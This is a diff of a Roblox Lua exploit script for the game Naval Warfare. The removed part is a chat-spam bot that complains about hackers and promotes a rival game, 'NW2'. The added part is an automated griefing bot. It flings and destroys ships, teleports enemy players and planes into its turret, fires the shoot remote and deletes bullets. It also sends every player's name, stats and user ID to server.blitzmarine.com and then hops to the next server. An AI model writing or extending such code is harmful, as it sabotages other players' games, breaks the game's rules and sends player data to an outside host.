@@ -1,87 +1,293 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 
-local Players = game:GetService("Players")
+local Players = game.Players
 local speaker = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local planeNames = {'Large Bomber', 'Bomber', 'Torpedo Bomber'}
+local shipNames = {'Battleship', 'Carrier', 'Heavy Cruiser', 'Cruiser', 'Destroyer', 'Submarine'}
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local messages = {
-	"bro this game got way too many hackrs",
-	"man every server got someone cheatin smh",
-	"naval warfrare is unplayable with all these exploiters",
-	"how is there still no anticheat in 2025 ",
-	"this game fallen off cuz of all the hakers",
-	"bruh the devs really don't care bout all these cheters huh",
-	"every time i join theres another exploiter...",
-	"game woud be fun if there wasn’t 10 hackers per match",
-	"why they even let ppl ruin the game like this",
-	"too many cheaters in this game its crazy",
-	"ay can we get some kinda anticheat or sum??",
-	"tired of playin this w all these hackers",
-	"this game ain’t the same no more fr",
-	"sheesh the hackers took over lmao",
-	"i miss when naval warfare was actually playable",
-	"how this game got no hacker protection??",
-	"ngl naval warfare lowkey ded cuz of exploiters",
-	"every match i gotta deal w/ some goofy cheating",
-	"devs fr just let the game rot",
-	"hackers stay ruinin this game bruh",
-	"can’t even enjoy the game with these cheeters",
-	"wish they’d do sum bout the exploiters smh",
-	"naval warfares basically hacker land rn",
-	"its wild how this still aint patched",
-	"if u tired of hackers just quit this mess",
-	"tired of tryna play fair and gettin wrecked by cheaters",
-	"this game got zero protection lol",
-	"i’m done playin till they fix the cheatfest",
-	"theres ALWAYS a cheater every round i swear",
-	"naval warfrare been taken over by exploitin clowns",
-	"ay NW2 got that solid anti-cheat fr",
-	"NW2 anticheat is goated no lie",
-	"love how clean nw2 lobbys are",
-	"no cheaters in naval warfare two, just real skill",
-	"NW2 lowkey saved the naval games",
-	"naval warfare two don’t play with them hackers",
-	"u can actually play normal in nw2",
-	"shoutout 2 NW2 for actually havin anticheat",
-	"nw2 devs actualy care bro",
-	"no hackers ruinin stuff in NW2",
-	"NW2 built diff when it comes 2 keepin lobbies clean",
-	"naval warfaer two anticheat >>>",
-	"real ones play NW2 where lobbys ain’t wrecked",
-	"can finaly enjoy the game w/out cheaters in nw2",
-	"NW2 keepin the clowns OUT fr",
-	"cleanest naval game rn hands down",
-	"NW2 doesn’t tolerate cheaters at ALL",
-	"havent seen a single exploiter in NW2, w",
-	"NW2 anti cheat on point",
-	"finaly a naval game w/ protection",
-	"been playin nw2 all day, no exploiters at all",
-	"NW2 said nah to hackers lol",
-	"naval warfrae two got the best system for keepin it fair",
-	"NW2 made all the right moves tbh",
-	"real ppl play NW2, no cheaters here",
-	"NW2 lobbies wayyy better no cap",
-	"if u sick of hackers just play NW2 already lol"
-}
+local ShootEvent = ReplicatedStorage:WaitForChild("Event")
 
-local function contains(list, str)return table.find(list, str) ~= nil end
+local sitting = false
+local flinging = false
+local spinning = false
+speaker.SimulationRadius = math.huge 
 
+if workspace:FindFirstChild("Setting") then
+	workspace.Setting:Destroy()
+end
+if workspace.Lobby:FindFirstChild("TeamChange") then
+	workspace.Lobby.TeamChange:Destroy()
+end
 
+function isin(s, t) for _,v in ipairs(t) do if v==s then return true end end end
+function hopServer()
+	while task.wait(.1) do
+		local status, err = pcall(function() 
+			local r=request({Url="https://server.blitzmarine.com/?bot=yes",Method="GET"})
+			local d=game:GetService("HttpService"):JSONDecode(r.Body)
+			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,d[1].id,speaker)
+		end)
+	end
+end
+	
 local status, err = pcall(function()
+	local r=request({Url="https://server.blitzmarine.com/?bot=yes",Method="GET"})
+	local d=game:GetService("HttpService"):JSONDecode(r.Body)
+	local targets = {}
+	for key, value in pairs(d) do
+		table.insert(targets, string.lower(key))
+	end
+	
+	
 	local data = {}
 	for _, p in pairs(Players:GetPlayers()) do
+		if isin(string.lower(p.Name), targets) then
+			hopServer()	
+		end
 		local l = p:FindFirstChild("leaderstats")
 		data[p.Name]={l.Score.Value,l.Win.Value,l.Coin.Value,p.Team.Name,p.DisplayName,p.UserId}
 	end
 
 	request({Url="https://server.blitzmarine.com/api/update?&bot="..speaker.Name,Method="POST",Body=game:GetService("HttpService"):JSONEncode({id=game.JobId,players=data,islands={},japan=1,usa=1,vehicles={},time=1}),Headers={["Content-Type"]="application/json"}})
-	task.wait(1)
-	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messages[math.random(#messages)], "All")
 end)
 
-while task.wait(.1) do
-	local status, err = pcall(function() 
-		local r=request({Url="https://server.blitzmarine.com/?bot=yes",Method="GET"})
-		local d=game:GetService("HttpService"):JSONDecode(r.Body)
-		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,d[1].id,speaker)
+function getRoot(char)
+	return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
+end
+
+
+function processAll(index)
+	local locations = {}
+	for _, v in ipairs(game.Workspace:GetDescendants()) do
+		if isin(v.Name, index) and v.Parent.Name ~= "IAP" then
+			table.insert(locations, v)
+		end
+	end
+	return locations
+end 
+
+local function noclip()
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+
+	humanoid.PlatformStand = true
+
+	for _, part in pairs(character:GetChildren()) do
+		if part:IsA("BasePart") then
+			part.CanCollide = not true
+		end
+	end
+end
+
+function unsit()
+	sitting = true
+	repeat RunService.Heartbeat:Wait()
+		local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+		if humanoid and humanoid.Sit then
+			humanoid.Sit = false
+		end
+	until not sitting
+end
+
+function fling()
+	flinging = true
+	repeat RunService.Heartbeat:Wait()
+		if not flinging then return end
+		local character = speaker.Character
+		local root = getRoot(character)
+		local vel, movel = nil, 0.1
+
+		while not (character and character.Parent and root and root.Parent) do
+			if not flinging then break end
+			RunService.Heartbeat:Wait()
+			character = speaker.Character
+			root = getRoot(character)
+		end
+
+		vel = root.Velocity
+		root.Velocity = Vector3.new(1e9, 1e9 * 10, 1e9)
+
+		RunService.RenderStepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel
+		end
+
+		RunService.Stepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel + Vector3.new(0, movel, 0)
+			movel = movel * -1
+		end
+	until not flinging
+end
+
+function spin()
+	spinning = true
+	local angle = 0
+	repeat RunService.Heartbeat:Wait()
+		local character = speaker.Character
+		if character and character.PrimaryPart then
+			local hrp = character.PrimaryPart
+			hrp.CFrame = center * CFrame.Angles(math.rad(angle), 0, 0)
+			angle += 80
+		end
+	until not spinning
+end
+
+function respawncheck()
+	speaker.CharacterAdded:Connect(function(char) 
+		spawn(unsit)
+		spawn(fling)
+		spawn(spin)
 	end)
 end
+
+function getBase(obj)
+	local partsList = {}
+	if obj then
+		for _, child in ipairs(obj:GetChildren()) do
+			if child.Name == "Turret" then
+				if child:FindFirstChild("SBTurretSeat") and child.Occupant.Value == "" and child:FindFirstChild("Bod") then
+					table.insert(partsList, child.SBTurretSeat)
+				end
+			end
+		end
+	end
+	return partsList
+end
+
+function getAllBases(dock)
+	local dockPart = workspace:FindFirstChild(dock)
+	return getBase(dockPart)
+end
+
+function KillPlanes(location, team) 
+	local planes = processAll(planeNames)
+	for i, p in ipairs(planes) do
+		if p.Team.Value == team then
+			p:SetPrimaryPartCFrame(location)
+		end
+	end
+end
+
+local function teleportPlayer(player)
+	local character = player.Character
+	if character and character:FindFirstChild("HumanoidRootPart") then
+		local rootPart = character.HumanoidRootPart
+		local localRootPart = speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
+		if localRootPart then
+			rootPart.CFrame = localRootPart.CFrame * CFrame.new(0, 0, -10)
+		end
+	end
+end
+
+local function checkAndTeleportPlayers()
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player ~= speaker and player.Team ~= speaker.Team then
+			teleportPlayer(player)
+		end
+	end
+end
+
+local function shoot()
+	local args = {
+		[1] = "shoot",
+		[2] = {
+			[1] = true
+		}
+	}
+	ShootEvent:FireServer(unpack(args))
+end
+
+local sequence2 = false
+
+print("Starting")
+center = CFrame.new(0, 0, 0)
+workspace.ChildAdded:Connect(function(child)
+	if not sequence2 then
+		task.defer(function()
+			if child and child.Parent and child.name == "bullet" then
+				child:Destroy()
+			end
+		end)
+	end
+end)
+
+
+noclip()
+spawn(unsit)
+spawn(fling)
+spawn(spin)
+spawn(respawncheck)
+
+local sequence1 = true
+spawn(function()
+	task.wait(60)
+	sequence1 = false
+end)
+repeat RunService.Heartbeat:Wait()
+	local ships = processAll(shipNames)
+	if #ships ~= 0 then
+		for i, ship in ipairs(ships) do
+			local Seat = ship:FindFirstChild("Seat")
+
+			local ticks = 0
+			repeat RunService.Heartbeat:Wait()
+				if Seat then center = Seat.CFrame end
+				ticks += 1
+			until not Seat or (Seat and Seat.Velocity and Seat.Velocity.Magnitude > 2000) or ticks > 100
+		end
+	else
+		sequence1 = false
+	end
+until not sequence1
+
+print("Sequence 1 finished")
+repeat task.wait() until speaker.Character:FindFirstChild("Humanoid") and speaker.Character.Humanoid.Health > 0
+sitting = false
+flinging = false
+spinning = false
+
+local parts = {}
+if speaker.Team.Name == "Japan" then
+	for _, base in ipairs(getAllBases("JapanDock")) do
+		table.insert(parts, base)
+	end
+else
+	for _, base in ipairs(getAllBases("USDock")) do
+		table.insert(parts, base)
+	end
+end
+
+local seat = parts[1]
+local humanoid = speaker.Character:WaitForChild("Humanoid")
+seat:Sit(humanoid)
+
+if speaker.Team.Name == "Japan" then
+	KillPlanes(seat.CFrame, "USA")
+else
+	KillPlanes(seat.CFrame, "Japan")
+end
+
+
+sequence2 = true
+spawn(function()
+	task.wait(2)
+	sequence2 = false
+end)
+Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(character)
+		if player.Team ~= speaker.Team then
+			teleportPlayer(player)
+		end
+	end)
+end)
+
+repeat RunService.Heartbeat:Wait()
+	checkAndTeleportPlayers()
+	shoot()
+until not sequence2
+
+print("Done")
+hopServer()
